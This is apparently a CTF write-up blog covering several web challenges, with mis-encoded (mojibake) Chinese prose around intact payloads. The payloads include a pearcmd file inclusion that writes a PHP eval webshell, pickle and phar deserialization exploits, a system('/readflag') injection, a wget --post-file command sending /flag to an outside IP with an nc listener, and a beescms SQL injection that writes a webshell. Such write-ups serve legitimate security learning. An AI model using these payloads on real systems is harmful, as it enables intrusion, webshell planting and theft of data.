<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POSTï¼š<br>aaa=show_source(next(apache_request_headers()));<br>User-Agent: /flag<br></code></pre></td></tr></table></figure>

<h3 id="33ã€-2022DASCTF-MAY-å‡ºé¢˜äººæŒ‘æˆ˜èµ›-é­”æ³•æµè§ˆå™¨"><a href="#33ã€-2022DASCTF-MAY-å‡ºé¢˜äººæŒ‘æˆ˜èµ›-é­”æ³•æµè§ˆå™¨" class="headerlink" title="33ã€[2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ›]é­”æ³•æµè§ˆå™¨"></a>33ã€[2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ›]é­”æ³•æµè§ˆå™¨</h3><p>åœ¨æ–‡æ¡£ä¸­å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>let ua = &quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;;    console[&quot;\x6c\x6f\x67&quot;](ua);<br></code></pre></td></tr></table></figure>

<p>å°†utf-8è½¬åŒ–ä¸ºå­—ç¬¦ æˆ–è€… ç›´æ¥åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ å³å¯å°†utf-8å­—ç¬¦ç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75<br></code></pre></td></tr></table></figure>

<p>æ·»åŠ å…¥æµè§ˆå™¨çš„user-agentå¤´å³å¯</p>
<h3 id="34ã€-DASCTF-2023-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-ez-cms"><a href="#34ã€-DASCTF-2023-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-ez-cms" class="headerlink" title="34ã€[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]ez_cms"></a>34ã€[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]ez_cms</h3><p>åå°åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://0baae324-999c-4467-afd4-d50da533a1e5.node5.buuoj.cn:81/admin/<br></code></pre></td></tr></table></figure>

<p>adminçˆ†ç ´å‡ºå¯†ç 123456<br>pearcmdæ–‡ä»¶åŒ…å«<br>ä½¿ç”¨burpä¼ å‚ ç›´æ¥å¤¹åœ¨urlåä¼šå› ä¸ºurlç¼–ç å¯¼è‡´å†™å…¥çš„ä¸€å¥è¯æ— æ³•æ­£å¸¸è§£æ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">+config-create+/&amp;r=../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[cmd]);?&gt;+../../../../../../../../tmp/1.php<br></code></pre></td></tr></table></figure>

<p>ä¹‹åèšå‰‘è¿æ¥å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://0baae324-999c-4467-afd4-d50da533a1e5.node5.buuoj.cn:81/admin/index.php?r=../../../../../../../../tmp/1.php<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;9541dd35-dc88-493c-b5ae-ee4f61fe40d8&#125;<br></code></pre></td></tr></table></figure>

<h3 id="35ã€-Dest0g3-520è¿æ–°èµ›-middle"><a href="#35ã€-Dest0g3-520è¿æ–°èµ›-middle" class="headerlink" title="35ã€[Dest0g3 520è¿æ–°èµ›]middle"></a>35ã€[Dest0g3 520è¿æ–°èµ›]middle</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> config<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    base_dir = os.path.dirname(__file__)<br>    resp = make_response(<span class="hljs-built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="hljs-built_in">open</span>(os.path.join(base_dir, <span class="hljs-string">&quot;config/__init__.py&quot;</span>)).read())<br>    resp.headers[<span class="hljs-string">&quot;Content-type&quot;</span>] = <span class="hljs-string">&quot;text/plain;charset=UTF-8&quot;</span><br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/home&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    data=request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br>    User = restricted_loads(base64.b64decode(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(User)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">5000</span>)<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-comment"># è¿™é‡Œæˆ‘ä¹Ÿæ”¹äº†ä¸€ä¸‹</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(cmd,<span class="hljs-built_in">list</span>) :<br>        s=<span class="hljs-string">&#x27;&#x27;</span>.join(cmd)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!!!!!!!!!&quot;</span>)<br>        s=<span class="hljs-built_in">eval</span>(s)<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;??????&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>pickel ååºåˆ—åŒ–<br>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> config<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;(cconfig\nbackdoor\np0\n0g0\n((S&#x27;__import__(\\&#x27;os\\&#x27;).popen(\\&#x27;cat /flag.txt\\&#x27;).read()&#x27;\nltR.&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(opcode))<br></code></pre></td></tr></table></figure>

<p>å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">KGNjb25maWcKYmFja2Rvb3IKcDAKMGcwCigoUydfX2ltcG9ydF9fKFwnb3NcJykucG9wZW4oXCdjYXQgL2ZsYWcudHh0XCcpLnJlYWQoKScKbHRSLg==<br></code></pre></td></tr></table></figure>

<h3 id="36-2022DASCTF-Apr-X-FATE-é˜²ç–«æŒ‘æˆ˜èµ›-warmup-php"><a href="#36-2022DASCTF-Apr-X-FATE-é˜²ç–«æŒ‘æˆ˜èµ›-warmup-php" class="headerlink" title="36[2022DASCTF Apr X FATE é˜²ç–«æŒ‘æˆ˜èµ›]warmup-php"></a>36[2022DASCTF Apr X FATE é˜²ç–«æŒ‘æˆ˜èµ›]warmup-php</h3><p>é¢˜ç›®éƒ¨åˆ†æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">spl_autoload_register</span>(function(<span class="hljs-variable">$class</span>)&#123;<br>    <span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;./class/&quot;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>&#125;);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-variable">$properties</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;properties&#x27;</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$action</span>,<span class="hljs-variable">$properties</span></span>)</span>&#123;<br><br>        <span class="hljs-variable">$object</span>=<span class="hljs-keyword">new</span> <span class="hljs-variable">$action</span>();<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$properties</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span>=&gt;<span class="hljs-variable">$value</span>)<br>            <span class="hljs-variable">$object</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Action</span>(<span class="hljs-variable">$action</span>,<span class="hljs-variable">$properties</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>payload<br>GETå‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">action=TestView<br></code></pre></td></tr></table></figure>

<p>POSTå‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">properties[template]=&#123;TableBody&#125;&amp;properties[rowHtmlOptionsExpression]=var_dump(system(&#x27;/readflag&#x27;));&amp;properties[data]=1<br></code></pre></td></tr></table></figure>

<h3 id="37ã€-2022DASCTF-Apr-X-FATE-é˜²ç–«æŒ‘æˆ˜èµ›-soeasy-phpï¼ˆä¸ä¼šï¼‰"><a href="#37ã€-2022DASCTF-Apr-X-FATE-é˜²ç–«æŒ‘æˆ˜èµ›-soeasy-phpï¼ˆä¸ä¼šï¼‰" class="headerlink" title="37ã€[2022DASCTF Apr X FATE é˜²ç–«æŒ‘æˆ˜èµ›]soeasy_phpï¼ˆä¸ä¼šï¼‰"></a>37ã€[2022DASCTF Apr X FATE é˜²ç–«æŒ‘æˆ˜èµ›]soeasy_phpï¼ˆä¸ä¼šï¼‰</h3><p>è€ƒè™‘å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–<br>POSTå¦‚ä¸‹å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">png=/var/www/html/upload.php&amp;flag=1<br></code></pre></td></tr></table></figure>

<p>ç„¶åä»&#x2F;upload&#x2F;head.pngä¸‹è½½å›¾ç‰‡<br>ä»¥æ–‡æœ¬æ‰“å¼€ å³å¯è·å¾—æºç <br>upload.phpé¡µé¢æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸Šä¼ å¤´åƒ&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;png&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸Šä¼ æˆåŠŸï¼š &quot;</span>.<span class="hljs-variable">$path</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>edit.phpé¡µé¢æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;error_reporting&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copyflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/copyflag&quot;</span>); <span class="hljs-comment">//ä»¥rootæƒé™å¤åˆ¶/flag åˆ° /tmp/flag.txtï¼Œå¹¶chown www-data:www-data /tmp/flag.txt</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;SFTQL&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">copyflag</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filewrite</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;png&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;png&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$f</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-string">&quot;flag&#123;&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-title function_ invoke__">filewrite</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;Don&#x27;t give me flag!!!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$flag</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$flag</span> == <span class="hljs-string">&quot;Give me flag&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">filewrite</span>(<span class="hljs-string">&quot;/tmp/flag.txt&quot;</span>, <span class="hljs-string">&quot;Don&#x27;t give me flag&quot;</span>);<br>            <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no !&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">filewrite</span>(<span class="hljs-string">&quot;/tmp/flag.txt&quot;</span>, <span class="hljs-variable">$flag</span>);  <span class="hljs-comment">//ä¸ç»™æˆ‘çœ‹æˆ‘è‡ªå·±å†™ä¸ªflagã€‚</span><br>        &#125;<br>        <span class="hljs-variable">$head</span> = <span class="hljs-string">&quot;uploads/head.png&quot;</span>;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$head</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$head</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆåŠŸæ›´æ¢å¤´åƒ&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;éæ­£å¸¸æ–‡ä»¶ï¼Œå·²è¢«åˆ é™¤&quot;</span>;<br>        &#125;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>pharæ–‡ä»¶å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copyflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/copyflag&quot;</span>); <span class="hljs-comment">//ä»¥rootæƒé™å¤åˆ¶/flag åˆ° /tmp/flag.txtï¼Œå¹¶chown www-data:www-data /tmp/flag.txt</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;SFTQL&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">copyflag</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">flag</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;a.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>

<p>ç„¶åé€šè¿‡æ·»åŠ è„æ•°æ®è§¦å‘unlink</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">phar://uploads/5a13b7b1b065e675e36187d2b4b69186.png/a.txtaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure>

<h3 id="38ã€-é™‡åŸæˆ˜â€ç–«â€2021ç½‘ç»œå®‰å…¨å¤§èµ›-CheckIN"><a href="#38ã€-é™‡åŸæˆ˜â€ç–«â€2021ç½‘ç»œå®‰å…¨å¤§èµ›-CheckIN" class="headerlink" title="38ã€[é™‡åŸæˆ˜â€ç–«â€2021ç½‘ç»œå®‰å…¨å¤§èµ›]CheckIN"></a>38ã€[é™‡åŸæˆ˜â€ç–«â€2021ç½‘ç»œå®‰å…¨å¤§èµ›]CheckIN</h3><p>ç›²æ³¨å¾—<br>admin<br>54a83850073b0f4c6862d5a1d48ea84f<br>ä½†æ˜¯æ²¡å•¥ç”¨<br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://192.168.237.128:7777/<br></code></pre></td></tr></table></figure>

<p>kaliä¸Šè¿è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -lvp 7777<br></code></pre></td></tr></table></figure>

<p>æ²¡æœ‰vps å†è§äº†</p>
<h3 id="39ã€-2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cybercms"><a href="#39ã€-2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cybercms" class="headerlink" title="39ã€[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cybercms"></a>39ã€[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cybercms</h3><p>å‘ç°åå°<br>&#x2F;admin&#x2F;login.php<br>beescmsæ¼æ´<br>payload user POSTä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">adm&#x27;/**/union/**/seselectlect/**/1,2,3,4,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e/**/into/**/outoutfilefile/**/&#x27;/var/www/html/nene.php<br></code></pre></td></tr></table></figure>

<p>ä¹‹åè®¿é—®<br>&#x2F;nene.php<br>POST</p>
